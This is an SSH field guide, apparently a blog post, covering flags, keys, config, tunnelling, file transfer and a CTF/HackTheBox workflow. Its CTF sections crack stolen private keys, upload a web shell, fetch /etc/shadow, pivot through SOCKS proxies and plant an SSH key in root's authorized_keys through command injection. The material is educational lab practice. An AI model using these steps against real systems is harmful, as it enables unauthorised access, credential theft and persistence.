SSH — Field Guide

2026-06-02 · 1 min read · Tools · ssh tunneling pivoting tools network

Key auth, port forwarding, SCP, SOCKS proxying, and a CTF workflow covering key cracking, pivoting, and writing your own key to a compromised box.

01 What is SSH

SSH (Secure Shell) is the standard protocol for encrypted remote access. It runs on port 22 by default and replaces old cleartext protocols like Telnet and rsh.

Beyond remote shells, SSH is a full tunneling toolkit — it handles file transfer, port forwarding, SOCKS proxying, and agent forwarding. In CTFs it's your primary foothold tool; in real-world it's the backbone of every sysadmin workflow.

02 Connecting

bash Basic connection syntax 
# Standard connection
ssh user@10.10.10.5

# Non-default port
ssh -p 2222 user@10.10.10.5

# Run a single command and exit
ssh user@10.10.10.5 'whoami && id'

# Connect with a specific private key
ssh -i ~/.ssh/id_rsa user@10.10.10.5

# Connect with verbose output (useful for debugging auth failures)
ssh -v user@10.10.10.5
ssh -vvv user@10.10.10.5  # maximum verbosity

# Disable host key checking (CTF/lab use only — MITM risk)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@10.10.10.5

03 Common Flags

FlagDescription
`-p <port>`Connect to a non-standard port
`-i <key>`Use a specific private key file
`-l <user>`Login name (alternative to `user@host`)
`-v / -vvv`Verbose — shows auth negotiation, useful for debugging
`-N`No remote command — used with port forwards
`-f`Background the SSH process after auth
`-T`Disable pseudo-terminal allocation
`-A`Forward SSH agent to the remote host
`-X`Forward X11 display
`-C`Compress traffic
`-o <option>`Pass any `ssh_config` option inline
`-J <jump>`Jump through a bastion host (ProxyJump)
`-L`Local port forward
`-R`Remote port forward
`-D`Dynamic SOCKS proxy

04 Key-Based Authentication

Password auth is fine for quick access, but key pairs are the standard for production systems — no password in shell history, no brute-force surface.

bash SSH key setup 
# Generate a key pair (Ed25519 is modern and fast)
ssh-keygen -t ed25519 -C 'my-key' -f ~/.ssh/id_ed25519

# RSA 4096 for compatibility with older systems
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa

# Copy public key to a remote server
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@10.10.10.5

# Manual method (if ssh-copy-id is not available)
cat ~/.ssh/id_ed25519.pub | ssh user@10.10.10.5 \
  'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'

# Fix permissions if SSH refuses your key
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_ed25519
chmod 644 ~/.ssh/id_ed25519.pub
CTF tip

If you find an id_rsa file on a compromised machine, copy it locally and use it:

chmod 600 id_rsa
ssh -i id_rsa user@10.10.10.5

If the key is password-protected, crack it with ssh2john + john:

ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

05 SSH Config File

~/.ssh/config saves connection parameters so you never type long flags again. Each Host block defines an alias.

bash ~/.ssh/config example 
Host htb
    HostName 10.10.10.5
    User root
    IdentityFile ~/.ssh/id_rsa
    Port 22
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null

Host prod
    HostName myserver.com
    User deploy
    IdentityFile ~/.ssh/deploy_key
    Port 2222

Host bastion
    HostName bastion.internal
    User admin
    IdentityFile ~/.ssh/bastion_key

Host internal
    HostName 192.168.10.5
    User root
    ProxyJump bastion   # routes through the bastion host

# Connect with just: ssh htb

06 Port Forwarding

Port forwarding is one of SSH's most powerful features — it tunnels traffic through the encrypted SSH connection, bypassing firewalls and reaching internal services.

Local forwarding (-L) — makes a remote port reachable on your local machine:

text 
ssh -L [local_port]:[remote_host]:[remote_port] user@ssh_host
bash Local port forwarding examples 
# Access a web app on the remote server's localhost:8080 via your local port 8080
ssh -L 8080:localhost:8080 user@10.10.10.5
# Now browse: http://localhost:8080

# Access an internal database only reachable FROM the SSH server
ssh -L 3306:10.10.10.20:3306 user@10.10.10.5
# Now: mysql -h 127.0.0.1 -P 3306

# Background it (no shell, just the tunnel)
ssh -fN -L 8080:localhost:8080 user@10.10.10.5

Remote forwarding (-R) — exposes your local port on the remote server. Used to receive reverse shells through NAT:

bash Remote port forwarding 
# Expose your local port 4444 as port 4444 on the remote server
ssh -R 4444:localhost:4444 user@10.10.10.5
# On the remote machine, a process connecting to localhost:4444
# will reach YOUR local listener

# Useful for receiving a reverse shell from a box you can't reach directly
ssh -fN -R 9001:localhost:9001 user@pivot-host

Dynamic forwarding (-D) — creates a local SOCKS proxy. Route ALL traffic through the SSH server:

bash Dynamic SOCKS proxy 
# Start SOCKS5 proxy on local port 1080
ssh -fN -D 1080 user@10.10.10.5

# Use with proxychains — add to /etc/proxychains.conf:
# socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains curl http://192.168.1.10/

# Use with curl directly
curl --socks5 127.0.0.1:1080 http://192.168.1.10/

07 File Transfer — SCP & SFTP

bash SCP (secure copy) 
# Download a file from remote to local
scp user@10.10.10.5:/etc/passwd ./passwd

# Upload a file to remote
scp shell.php user@10.10.10.5:/var/www/html/

# Recursive directory copy
scp -r user@10.10.10.5:/home/user/data/ ./data/

# Non-standard port
scp -P 2222 user@10.10.10.5:/flag.txt ./

# With a specific key
scp -i ~/.ssh/id_rsa user@10.10.10.5:/root/root.txt ./
bash SFTP interactive session 
sftp user@10.10.10.5

sftp> ls -la
sftp> get /etc/shadow
sftp> put linpeas.sh /tmp/
sftp> bye

08 Real-World Use Cases

Jump host / bastion — access an internal server through a DMZ host:

bash ProxyJump through a bastion 
# Single hop
ssh -J bastion.corp.com user@192.168.10.5

# Multiple hops
ssh -J hop1,hop2 user@final-target

# Or define it in ~/.ssh/config (cleaner)
# Host internal
#     ProxyJump bastion

Persistent reverse tunnel — keep a remote machine reachable even when it's behind NAT:

bash Persistent reverse tunnel with autossh 
# Install autossh on the remote machine
sudo apt install autossh

# Keep a reverse tunnel alive — exposes remote's port 22 on your server's port 2222
autossh -M 0 -fN \
  -o 'ServerAliveInterval 30' \
  -o 'ExitOnForwardFailure yes' \
  -R 2222:localhost:22 user@your-vps.com

# Now SSH into the remote machine from your VPS:
ssh -p 2222 remote-user@localhost

SSH escape sequences — control a hung session without closing the terminal:

bash SSH escape sequences 
# Press Enter, then ~ to access the escape menu:
~.    # Kill a frozen SSH connection
~C    # Open SSH command prompt (add port forwards mid-session)
~#    # List forwarded connections
~?    # Show all escape sequences

# Example: add a local forward to a running session
# Press Enter, ~C, then:
-L 8080:localhost:80

09 CTF & HackTheBox Workflow

SSH on a CTF box is usually the end goal of initial access — a stable shell beats a netcat reverse shell every time. Port forwarding is essential for reaching internal services.

bash CTF SSH checklist 
export IP=10.10.10.5

# 1. Check what auth methods the server accepts
nmap --script ssh-auth-methods -p 22 $IP

# 2. Try default/common credentials
ssh root@$IP
ssh admin@$IP

# 3. If you have a key file from the box
chmod 600 id_rsa
ssh -i id_rsa user@$IP

# 4. Crack a password-protected key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# 5. Enumerate users (older OpenSSH versions)
nmap --script ssh-enum-algos,ssh2-enum-algos -p 22 $IP
bash Pivot to internal services via port forward 
# You have SSH on the box and see internal services in netstat
# e.g. a web app on 127.0.0.1:8080 and a DB on 127.0.0.1:3306

# Forward both to your machine
ssh -fN \
  -L 8080:127.0.0.1:8080 \
  -L 3306:127.0.0.1:3306 \
  user@$IP

# Now access them locally
curl http://localhost:8080
mysql -h 127.0.0.1 -P 3306 -u root

# Reach a whole internal subnet via SOCKS proxy
ssh -fN -D 1080 user@$IP
proxychains nmap -sT -Pn -p 80,443,8080 10.10.10.0/24
bash Write your key to a box you already have RCE on 
# If you have RCE (e.g. command injection, web shell) and .ssh is writable:
# 1. Generate a key pair on your machine
ssh-keygen -t ed25519 -f /tmp/htb_key -N ''

# 2. Inject your public key via the RCE
curl 'http://10.10.10.5/exec?cmd=mkdir+-p+/root/.ssh'
curl 'http://10.10.10.5/exec?cmd=echo+SSH_PUBKEY+>>+/root/.ssh/authorized_keys'

# 3. SSH in cleanly
ssh -i /tmp/htb_key root@$IP
Quick reference

-fN backgrounds the connection and runs no command — perfect for pure tunnels.
-vvv shows exactly why auth is failing — check it before assuming the key is wrong.
~. (Enter then ~.) kills a frozen session cleanly.
chmod 600 id_rsa — SSH silently refuses keys with open permissions.
ssh2john + john — standard workflow for cracking passphrase-protected keys.
ProxyJump / -J is cleaner than chaining multiple ssh commands for multi-hop pivoting.
